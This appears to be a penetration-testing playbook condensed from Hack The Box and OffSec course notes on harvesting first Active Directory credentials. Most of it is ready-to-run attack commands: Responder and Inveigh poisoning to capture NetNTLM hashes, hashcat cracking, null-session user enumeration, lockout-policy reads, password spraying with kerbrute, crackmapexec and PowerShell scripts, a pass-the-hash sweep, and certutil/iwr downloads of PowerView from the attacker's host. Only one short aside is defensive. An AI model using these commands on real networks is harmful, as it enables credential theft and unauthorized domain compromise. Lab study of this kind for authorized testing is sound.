# 2 · Harvest the first credentials

> **Goal:** turn a no-cred foothold into your **first valid domain credentials**. Two routes:
> **(A) poisoning** — capture NetNTLM hashes off the wire and crack them; **(B) password
> spraying** — build a user list, check the lockout policy, spray one password across all users.
>
> Condensed from `htbad/` (06, 07, 08, 09, 10, 11, 12) and `offad/` (18). `{{VAR}}` placeholders
> filled by [WorkflowHelper.html](../WorkflowHelper.html).

---

## Route A — LLMNR/NBT-NS poisoning

### From Linux — Responder → Hashcat

```bash
sudo responder -I tun0 -A          # -A = analyze only (passive, no poisoning) — look first
sudo responder -I tun0             # active: poison LLMNR/NBT-NS/MDNS, capture NetNTLM hashes
```

Hashes land in `/usr/share/responder/logs/`. Crack them:

```bash
hashcat -m 5600 {{HASHFILE}} /usr/share/wordlists/rockyou.txt      # NetNTLMv2
```

### From Windows — Inveigh

```powershell
Import-Module .\Inveigh.ps1
(Get-Command Invoke-Inveigh).Parameters
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y

# or the C# build
.\Inveigh.exe
```

> Defensive aside — disable NBT-NS on all interfaces (what a hardened host looks like):
> ```powershell
> $regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces"
> Get-ChildItem $regkey | foreach { Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose }
> ```

---

## Route B — Password spraying

> **When to spray:** spraying is *domain-level* (test against the DC = whole domain), so do it
> **once, early**, only when you have usernames but no password — or when new material appears
> (fresh usernames, or a cracked/looted password to test for reuse). Popping a new box → **loot,
> don't re-spray**. Got a hit? **Stop and pivot** to credentialed enum (phase 3).
>
> **CHECK THE LOCKOUT POLICY FIRST.** One guess per account per observation window, or you lock
> accounts and possibly fail the objective.

### Step 1 — Build the target user list

```bash
# null-session / low-priv enumeration of domain users
enum4linux -U {{DC_IP}} | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
rpcclient -U "" -N {{DC_IP}}                                  # then: enumdomusers
crackmapexec smb {{DC_IP}} --users                           # null session
sudo crackmapexec smb {{DC_IP}} -u {{USERNAME}} -p {{PASSWORD}} --users   # authenticated
./windapsearch.py --dc-ip {{DC_IP}} -u "" -U
ldapsearch -H ldap://{{DC_IP}} -x -b "DC={{DOMAIN_NB}},DC=LOCAL" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "
kerbrute userenum -d {{DOMAIN}} --dc {{DC_IP}} {{USERLIST}}  # no-auth Kerberos user validation
```

### Step 2 — Retrieve the password / lockout policy

```bash
crackmapexec smb {{DC_IP}} -u {{USERNAME}} -p {{PASSWORD}} --pass-pol
enum4linux -P {{DC_IP}}
enum4linux-ng -P {{DC_IP}} -oA ilfreight
rpcclient -U "" -N {{DC_IP}}                                  # then: getdompwinfo
ldapsearch -H ldap://{{DC_IP}} -x -b "DC={{DOMAIN_NB}},DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```

```cmd
:: Windows — null-session probe + native policy read
net use \\DC01\ipc$ "" /u:""
net accounts
```

```powershell
# PowerView (Kali: cp /usr/share/windows-resources/powersploit/Recon/PowerView.ps1 .)
# Pull it onto the target from your http server (python3 -m http.server 80):
#   certutil.exe -urlcache -split -f "http://{{LHOST}}/PowerView.ps1" "C:\PowerView.ps1"
#   iwr -Uri http://{{LHOST}}/PowerView.ps1 -OutFile C:\PowerView.ps1
Import-Module .\PowerView.ps1
Get-DomainPolicy
```

> Note **Lockout threshold** (e.g. 5) and **Observation window** (e.g. 30 min). Stay a couple below
> the threshold, wait out the window between rounds. Min-password-length etc. also seed wordlists.

### Step 3 — Spray

**From Linux:**

```bash
# stealthiest — Kerberos pre-auth, only 2 UDP frames per try
kerbrute passwordspray -d {{DOMAIN}} --dc {{DC_IP}} {{USERLIST}} {{PASSWORD}}

# crackmapexec SMB — noisy, but flags (Pwn3d!) = local admin. Does NOT check lockout policy.
sudo crackmapexec smb {{DC_IP}} -u {{USERLIST}} -p {{PASSWORD}} --continue-on-success | grep +
sudo crackmapexec smb {{DC_IP}} -u {{USERNAME}} -p {{PASSWORD}}                  # single account
sudo crackmapexec smb --local-auth {{SUBNET}} -u {{USERNAME}} -H {{NTLM_HASH}} | grep +   # PtH sweep

# rpcclient loop
for u in $(cat valid_users.txt); do rpcclient -U "$u%{{PASSWORD}}" -c "getusername;quit" {{DC_IP}} | grep Authority; done
```

**From Windows:**

```powershell
# dafthack/DomainPasswordSpray — auto-builds user list, reads lockout policy, skips at-risk (don't use -Force)
iwr https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/master/DomainPasswordSpray.ps1 -OutFile DomainPasswordSpray.ps1
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password {{PASSWORD}} -OutFile spray_success -ErrorAction SilentlyContinue

# kerbrute (Windows build) — username file must be ANSI-encoded or you get a network error
.\kerbrute_windows_amd64.exe passwordspray -d {{DOMAIN}} .\usernames.txt "{{PASSWORD}}"

# native LDAP spray (no tools dropped) — 3-arg DirectoryEntry binds only if the password is correct
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://" + $PDC + "/DC=$($domainObj.Name.Replace('.', ',DC='))"
New-Object System.DirectoryServices.DirectoryEntry($SearchString, "{{USERNAME}}", "{{PASSWORD}}")

# Spray-Passwords.ps1 (shipped on lab host) — -File <wordlist> to test many, -Admin includes admins
.\Spray-Passwords.ps1 -Pass {{PASSWORD}} -Admin
```

> `(Pwn3d!)` in crackmapexec output = the account is **local admin** on that target — a fast-track
> to phase 4. `+` = valid creds, `-` = invalid.
